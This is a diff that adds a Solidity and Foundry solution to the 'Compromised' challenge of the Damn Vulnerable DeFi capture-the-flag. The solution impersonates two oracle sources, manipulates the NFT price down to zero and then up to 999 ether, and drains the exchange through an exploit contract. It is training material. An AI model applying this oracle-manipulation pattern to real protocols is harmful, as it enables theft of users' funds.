@@ -9,6 +9,7 @@ import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -75,7 +76,28 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+        CompromisedExploit exploit = new CompromisedExploit{value: address(this).balance}(oracle, exchange, nft, recovery);
+
+        vm.startPrank(sources[0]);
+        oracle.postPrice(symbols[0], 0);
+        vm.stopPrank();
+
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[0], 0);
+        vm.stopPrank();
+
+        exploit.buy();
+
+        vm.startPrank(sources[0]);
+        oracle.postPrice(symbols[0],999 ether);
+        vm.stopPrank();
+
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[0],999 ether);
+        vm.stopPrank();
         
+        exploit.sell();
+        exploit.recover(999 ether);
     }
 
     /**
@@ -94,4 +116,40 @@ contract CompromisedChallenge is Test {
         // NFT price didn't change
         assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
     }
+}
+
+contract CompromisedExploit is IERC721Receiver {
+
+    TrustfulOracle public oracle;
+    Exchange public exchange;
+    DamnValuableNFT public nft;
+    uint256 nftId;
+    address recovery;
+
+    constructor(TrustfulOracle _oracle, Exchange _exchange, DamnValuableNFT _nft, address _recovery) payable {
+        oracle =  _oracle;
+        exchange = _exchange;
+        nft = _nft;
+        recovery = _recovery;
+    }
+
+    function buy() external payable {
+        uint _nftId = exchange.buyOne{value: 1}();
+        nftId = _nftId;
+    }
+
+    function sell() external payable {
+        nft.approve(address(exchange), nftId);
+        exchange.sellOne(nftId);
+    }
+
+    function recover(uint256 amount) external {
+        payable(recovery).transfer(amount);
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+
+    receive() external payable {}
 }
